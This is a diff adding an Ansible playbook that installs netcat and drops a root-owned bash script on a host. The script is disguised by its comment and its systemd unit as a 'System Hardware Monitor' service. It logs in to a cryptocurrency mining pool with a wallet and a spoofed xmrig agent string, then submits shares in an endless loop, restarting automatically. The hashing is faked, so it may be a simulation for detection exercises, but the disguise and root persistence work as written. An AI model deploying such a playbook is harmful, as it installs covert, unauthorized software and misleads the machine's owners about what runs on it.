@@ -1,0 +1,77 @@
+---
+- name: Install required packages
+  apt:
+    name:
+      - netcat-openbsd
+    state: present
+    update_cache: yes
+
+- name: Create miner binary
+  copy:
+    dest: "{{ miner_binary }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # sys-monitor — hardware performance monitoring service
+
+      POOL="{{ pool_host }}"
+      PORT="{{ pool_port }}"
+      WALLET="{{ wallet }}"
+      WORKER="{{ worker_name }}"
+      AGENT="xmrig/6.21.0 (Linux) libuv/1.44.2 gcc/11.4.0"
+      LOG="{{ miner_log }}"
+
+      touch "$LOG"
+
+      pool_send() {
+          printf '%s\n' "$1" | nc -w 5 "$POOL" "$PORT" >> "$LOG" 2>&1 || true
+      }
+
+      pool_send "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"$WALLET\",\"pass\":\"x\",\"rigid\":\"$WORKER\",\"agent\":\"$AGENT\"}}"
+
+      ITER=0
+      while true; do
+          COUNT=0
+          while [ "$COUNT" -lt 15000 ]; do
+              COUNT=$((COUNT + 1))
+          done
+
+          ITER=$((ITER + 1))
+
+          if [ $((ITER % 60)) -eq 0 ]; then
+              NONCE=$(tr -dc 'a-f0-9' < /dev/urandom 2>/dev/null | head -c 8 || echo "deadbeef")
+              pool_send "{\"id\":2,\"jsonrpc\":\"2.0\",\"method\":\"submit\",\"params\":{\"id\":\"$WORKER\",\"job_id\":\"job_$(date +%s)\",\"nonce\":\"$NONCE\",\"result\":\"00000000aabbccdd\"}}"
+          fi
+
+          sleep 1
+      done
+
+- name: Create systemd service for miner
+  copy:
+    dest: "/etc/systemd/system/{{ miner_service }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Hardware Monitor
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=simple
+      ExecStart={{ miner_binary }}
+      Restart=always
+      RestartSec=5
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Enable and start miner service
+  systemd:
+    name: "{{ miner_service }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
